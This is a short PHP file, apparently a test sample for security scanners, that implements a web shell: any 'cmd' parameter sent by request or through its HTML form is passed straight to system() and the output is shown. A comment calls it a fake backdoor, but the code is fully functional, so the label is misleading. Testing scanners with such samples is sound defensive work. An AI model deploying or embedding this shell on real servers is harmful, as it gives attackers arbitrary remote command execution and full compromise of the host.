<?php
// HIVE Test Backdoor - shell.php
// This is a FAKE backdoor for security scanner testing
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<html>
<body>
<form method="POST">
<input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
</body>
</html>
